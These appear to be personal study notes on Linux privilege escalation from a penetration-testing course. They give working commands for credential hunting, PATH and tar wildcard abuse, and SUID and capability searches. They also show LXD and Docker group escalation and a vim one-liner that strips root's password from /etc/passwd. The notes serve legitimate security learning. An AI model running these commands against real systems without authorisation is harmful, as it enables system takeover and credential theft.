Things to look out for:
***OS Version***: Knowing the distro will give us an opportunity to look at which tools are available. 
***Kernel Version***: There may be publicly available exploits which target a specific kernel version 
***Running Services***: Knowing which services are running on the host are important. Especially important is services running as root `ps aux | grep root`
***Installed Packages and Package Versions***:  Out of date packages may be easy leveraged for privilege escalation.
***Logged In Users***: Knowing which users are logged in gives better ability for lateral movement. `ps au`
***User's  Home Directories***: `ls /home` check if user directories are readable and check for bash history or ssh keys
***Sudo Priveleges***: Check which commands the user can run as root `sudo -l`
***Password Hashes***: Check if we have access to `/etc/passwd` or `/etc/shadow`
***Cron Jobs***: Cron jobs/scheduled tasks can be ran as root and misconfigured.
***Unmounted File System***: Could possibly mount an unmounted file which may contain sensitive files/passwords `lsblk`.
***SETUID and GETUID Permissions***: Binaries are set with this value to allow to run a command as root without being ran as a root level user.
***Writeable Directories***: To find where to import and store tools.
***Writeable Files***: Are any scripts or config files world writeable? 

## Environment Enumeration
Enumeration is the key to privilege escalation and we can use a tool like *Linpeas*.

#### Typical Enumeration Commands
- `whoami` - what user are we running as
- `id` - what groups does our user belong to?
- `hostname` - what is the server named, can we gather anything from the naming convention?
- `ifconfig` or `ip -a` - what subnet did we land in, does the host have additional NICs in other subnets?
- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

*OS Release*: `cat /etc/os-release`
*Environment Variable*: `env` may hold passwords stored as environment variables.

## Linux Services and Enumeration
- What services and applications are installed?
- What services are running?
- What sockets are in use?
- What users, admins, and groups exist on the system?
- Who is current logged in? What users recently logged in?
- What password policies, if any, are enforced on the host?
- Is the host joined to an Active Directory domain?
- What types of interesting information can we find in history, log, and backup files
- Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?
- Current IP addressing information
- Anything interesting in the `/etc/hosts` file?
- Are there any interesting network connections to other systems in the internal network or even outside the network?
- What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)
- Can we access the `bash_history` file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?
- Are any Cron jobs running on the system that we may be able to hijack?

### Internals
Internal configurations of integrated systems. 

*Network Interfaces*: `ip a`
*Hosts File*: `cat /etc/hosts`  ~Good idea to check last login to system and how frequently~
*Last Login*: `lastlog`
*Who else is on the system*: `finger` `w` 
*Command History*: `history`
*CronJobs*: `ls -la /etc/cron.daily/`
*Proc Filesystem*: ` find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`

### Services
Could find installed packages that may have a vulnerability. 
*Installed Packages*: `ls -la /etc/cron.daily/`
*Sudo*: Sudo may be vulnerable `sudo -V`
*Binaries*: `ls -l /bin /usr/bin/ /usr/sbin/`
*GTFObins*: Platform for checking vulnerable binaries 
```shell-session
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

#### Strace 
We can use a tool like `strace` to find and analyze system  calls and signal processing. We can understand how it accesses system resources, processes signals, and receives and sends data from the operating system. 
```shell-session
strace ping -c1 10.129.112.20
```

#### Configuration Files
Users can read almost all config files on Linux. Can often reveal how a service is configured and may contain sensitive information.
```shell-session
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

Scripts created by admins may not have their rights restricted.
*Scripts*
```shell-session
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

*Running Services*
```shell-session
ps aux | grep root
```

## Credential Hunting
When enumerating a system its important to note any credentials. These can be found in configuration files (`.conf, .xml, .config`), shell scripts, a user's bash history file, backup (`.bak`) files, within databases or text files.

*Web root my contain database credentials* 
```shell-session
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

*the spool or webroot directories may contain valuable information*
```shell-session
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

#### SSH Keys
Its useful to search around the system for private SSH Keys
```shell-session
ls ~/.ssh
```

## Path Abuse
`PATH` is an environment variable that specifies the set of directories where an executable can be located. An accounts `PATH` variable is a set of absolute paths allowing user to type a command without specifying the absolute path to a binary. A user can type `cat /tmp/text.txt` instead of `/bin/cat /tmp/text.txt`.

We can check the contents of the `PATH` variable by typing `env | grep PATH` or `echo $PATH`

We can create a script or program in a directory specified in the `$PATH` will make it executable from any directory on the system.

Adding *.* to a user's `PATH` adds their current working directory to the list. If we can modify a users path we can replace a common binary like `ls` with a malicious script such as a reverse shell. if we add *.* to `PATH` by using the command
```
PATH=.:$PATH
export PATH
```
we will be able to run binaries in our local working directory. Now we can add a malicious script to our current working directory and when a user types `ls` it will call the malicious script in the current working directory.

## Wildcard Abuse
Wildcard characters can be used as a replacement for other characters. 

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options.


## Escaping Restricted Shells
Restricted shells limit user's ability to execute commands. Only usually allowed to execute a specific set of commands in specific directories. 

### RBASH
*Rbash* is a restricted version of the `bash` shell which limits users ability to use certain features of the BASH shell. Used to provide a safe environment for users which may inadvertently damage environment. 

### RKSH 
*Restricted Korn Shell*, standard restricted CLI which limits users ability to execute commands in certain directories, creating or modifying shell functions, and modifying the shell environment. 

### RZSH
*Restricted ZShell*, is a restricted version of Zshell, Limits running shell scripts, defining aliases, and modifying shell environment. 

### Escaping
it may be possible to escape from a CLI by injecting commands which the shell accepts. May be possible to inject additional commands into an allowed command. 

#### Command Injection
In a shell where we are allowed the `ls` command, we need to use predetermined arguments, such as `ls -l` or `ls -a` 
```shell-session
ls -l `pwd` 
```

#### Command Substitution
If a shell allows a user to execute a command in backticks  $`$  we may be able to execute a command to escape the shell.

#### Command Chaining
To put multiple commands on a single line we can use `;` or `|` 

#### Environment Variables
If a shell is restricted to certain directories, a shell might use an environment variable to specify this. If we can modify this environment variable we can escape the restrictions. 

#### Shell Functions
Can escape shell using shell functions.


## Special Permissions
*Set User ID upon Execution* (`setuid`) can allow users to execute a script with the permissions of another users typically with elevated privileges. 

```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

the `setuid` bit appears as an s.

The *Set-Group-ID* (`setgid`) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

```shell-session
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

We can use [GTFOBins](https://gtfobins.github.io/) to find and exploit 

## Sudo Rights Abuse
```
sudo -l
```
*You Know the Rules*

## Privileged Groups
### LXD 
`LXD` is similiar to Docker and Ubuntu's Container Manager. Upon installation, all users are added to the *LXD group*. Membership of this group can be used to escalate priveleges by creating a *LXD Container*, making it privileged, and then accessing the host file system at `/mnt/root` 


```shell-session
id
```
*Unzip Alpine Image*
```shell-session
unzip alpine.zip 
```
*Start LXD initialization (choose defaults for each prompt)*
```
lxd init
```
*Import the local image*
```shell-session
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```shell-session
lxc init alpine r00t -c security.privileged=true
```
*Mount the Host File System*
```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
```shell-session
lxc start r00t
```

### Docker
Placing a user in a docker group is essentially equivalent to root access to the file system without requiring a password.
One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

## Capabilities
Security feature in Linux that allows specific privileges to be granted to certain processes allowing them to perform actions that may be otherwise restricted.
Allows for more fine control over which processes have access to certain privileges making it more secure than the traditional Unix model of granting privileges based on users and groups.

A possible vulnerability is using capabilities to gain privileges if programs aren't sufficiently sand boxed. Programs may have more privileges than they need, which may be possible to exploit these privileges to do unauthorized actions.

In Ubuntu we use the `setcap` command to set capabilities for certain executables.

### Set Capability
we could use the following command to set the `cap_net_bind_service` capability for an executable
```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

When capabilities are set for a certain binary it means the binary can perform specific tasks
The `cap_net_bind_service` means that the binary will be able to bind network ports which is usually restricted. 

`cap_sys_admin` allows binary to perform actions within system admin privileges.

|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |
Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |
### Enumerating Capabilities
```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
Command uses `-exec` flag to run `getcap` command on each and provides a list of capabilities as output.
### Exploitation
If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability.

If a binary is run without `sudo` and contains the `cap_dac_override` it can escalate the privilege of the user who runs it and the system file.

if `/usr/bin/vim.basic` has `cap_dac_override`
```shell-session
/usr/bin/vim.basic /etc/passwd
```

```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
```
```shell-session
root:x:0:0:root:/root:/bin/bash
root::0:0:root:/root:/bin/bash
```

the first bit after the `:` with the `x` indicates that a password is used to login. If we remove that x we can just `su` to root.

## Vulnerable Services
There are multiple services with vulnerabilities which allow privilege exploitation.

## Cron Job Abuse
CronJobs are services that are set to run  at certain times, this can be *on boot* or at set times. They typically perform administrative tasks such as; running backups, and cleaning directories. 

the `crontab` command will create a CronFile which will be ran by the Cron Daemon on the schedule specified. When created, cronfiles are will be created in `/var/spool/cron`.  

Each entry into the cron table requires 6 items `minutes, hours, days, months, weeks, commands.`

Root CronTab only usually editable by the root user. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule we can usually ascertain how often it runs. In this case we may be able to append a line on to the end of a script which may execute the next time a job runs.

### Finding writable files
```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Tool called [pspy](https://github.com/DominicBreuker/pspy) to view running processes without root privs.

```shell-session
./pspy64 -pf -i 1000
```
The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

Cronjob runs a writeable file every 3 minutes 
*We should always copy the original script as to be none destructive to the environment*

## Containers
Containers operate at the Operating System Level and Virtual Machines operate at the hardware level. Containers share an os and isolate application processes from the rest of the system.

Isolation and Virtualization are essential because they help manage resources and security aspects as efficiently as possible. Isolation commonly found from api's to not allow access to databases. 

### Linux Containers
Linux Containers (*LXC*) is an OS level virtualization techinque which allows linux systems to run in isolation from eachother on a single shared host by owning their own process but sharing the host system kernel for them. *LXC* is popular due to ease of use and has become an essential part of IT security.

*LXC* consumes fewer resources than a vm and have a standard interface, making it easy to manage multiple containers at the same time. 

Most widely used virtualization for Linux.

### Linux Daemon
*LXD* is similar but is designed to contain a complete operating system. 
Therefore not a application container but a system container. 
To use these services to escalate our privileges they must be in *LXC* or *LXD* group which we can check with the `id` command.

There are several ways we can now exploit *LXD*/*LXC*. We can create our own container and transfer it to the target system or use an existing container. Admins typically use templates which use little to no security.

***If we find an image on an environment***
Images often do not have passwords so we can use that against the environment. 

We need to import the container as an image:
```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

after this we can verify the image has been successfully imported, we can init the image and configure it by specifying the `security.privileged` flag and the root path for the container. `security.privileged` disables all isolation features and allows us to act on the host

```shell-session
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```shell-session
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```


